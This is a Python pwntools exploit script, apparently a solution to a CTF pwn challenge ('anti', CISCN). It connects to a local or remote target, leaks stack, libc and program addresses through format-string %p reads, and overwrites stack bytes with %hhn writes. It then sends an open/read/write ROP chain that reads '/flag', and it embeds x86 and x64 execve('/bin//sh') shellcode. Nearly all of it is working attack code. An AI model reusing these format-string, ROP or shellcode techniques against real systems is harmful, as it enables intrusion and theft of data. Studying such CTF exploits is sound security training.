from pwn_debug import *


pdbg=pwn_debug("./anti")
pdbg.context.terminal=['tmux', 'splitw', '-h']
context.log_level='debug'
pdbg.local("")
pdbg.debug("2.23")
pdbg.remote('172.1.2.15',9999,"./libc-2.23.so")

switch=1
if switch==1:
    p=pdbg.run("local")
elif switch==2:
    p=pdbg.run("debug")
elif switch==3:
    p=pdbg.run("remote")
#-----------------------------------------------------------------------------------------
s       = lambda data               :p.send(str(data))        #in case that data is an int
sa      = lambda delim,data         :p.sendafter(str(delim), str(data)) 
sl      = lambda data               :p.sendline(str(data)) 
sla     = lambda delim,data         :p.sendlineafter(str(delim), str(data)) 
r       = lambda numb=4096          :p.recv(numb)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
it      = lambda                    :p.interactive()
uu32    = lambda data   :u32(data.ljust(4, '\0'))
uu64    = lambda data   :u64(data.ljust(8, '\0'))
bp      = lambda bkp                :pdbg.bp(bkp)
sym     = lambda symbol             :pdbg.sym(symbol)
def bpp():
	bp([])
	input()
#elf=pdbg.elf
libc=pdbg.libc
sh_x86_18="\x6a\x0b\x58\x53\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"
sh_x86_20="\x31\xc9\x6a\x0b\x58\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"
sh_x64_21="\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x99\x0f\x05"
#https://www.exploit-db.com/shellcodes
#-----------------------------------------------------------------------------------------
ru('Gift: ')
stack=int(ru('\n'),16)
print 'stack:'+hex(stack)

def calc(offset,value,fmt='hhn'):
    return '%'+str(value)+'c%'+str(offset)+'$'+fmt+'\x00'
bp([0xf35])
# stack

tmp=stack&0xff
sl(calc(6,tmp+0x10))
sl(calc(10,0xb6))

stack2=stack+0x7fffffffd960-0x7fffffffda78-0x18
sl(calc(6,tmp+0x30))
stack3=stack+0x7fffffffda80-0x7fffffffda78
sl(calc(10,stack3&0xff))




sl(calc(6,tmp+0x31))
sl(calc(10,(stack2>>8)&0xff))

sl(calc(6,tmp+0x30))
sl(calc(10,(stack2+8)&0xff))
sl(calc(15,(0x8c)))
sl(calc(10,(stack2+9)&0xff))
sl(calc(15,(0x4f)))



sl(calc(6,tmp+0x31))
sl(calc(10,(stack3>>8)&0xff))
sl(calc(15,(stack2&0xff)))

sl(calc(6,tmp+0x30))
sl(calc(10,(stack3&0xff)+1))
sl(calc(15,(stack2>>8)&0xff))

sl(calc(6,(stack2)&0xff))

sl("Ciscn20\x00")
###############################

now_stack=stack+0x7fffffffec28-0x7fffffffed58
sl(calc(13,(now_stack+0x88)&0xff))
sl(calc(45,0x90))
sl(calc(23,2))

sl("aaaa%23$pbbbb")
ru("aaaa")
addr=int(ru("bbbb"),16)+0x7ffff77c6000-0x7ffff7b8b690
print "addr:"+hex(addr)

sl("aaaa%7$pbbbb")
ru("aaaa")
pro_base=int(ru("bbbb"),16)+0x555555554000-0x555555554f96
print "pro_base:"+hex(pro_base)

buffer=pro_base+0x202040
tmp=buffer+0x20-0x8
for i in range(6):
    sl(calc(13,(now_stack+i)&0xff))
    sl(calc(45,tmp&0xff))
    tmp>>=8


libc_base=addr
buffer_addr=buffer+0x20
pop_rdx=0x0000000000001b92+libc_base
pop_rdi=0x0000000000021112+libc_base
pop_rsi_1=0x0000000000021110+libc_base




flag_str_addr=buffer_addr+0xb0
flag_addr=buffer_addr+0xc0
func_open=libc.sym['open']+libc_base
func_read=libc.sym['read']+libc_base
func_write=libc.sym['write']+libc_base

rop_chain=flat([
    pop_rdi,
    flag_str_addr,
    pop_rsi_1,
    0,
    0,
    func_open,
    pop_rdi,
    1,
    pop_rsi_1,
    flag_addr,
    0,
    pop_rdx,
    0x30,
    func_read,
    pop_rdi,
    2,
    pop_rsi_1,
    flag_addr,
    0,
    pop_rdx,
    0x30,
    func_write
])
rop_chain=rop_chain.ljust(0xb0,'\x00')+'/flag\x00\x00\x00'+'\x00'*8
rop_chain=rop_chain.ljust(0x100,'\x00')

sl("Ciscn20\x00".ljust(0x20,'\x00')+rop_chain)
it()
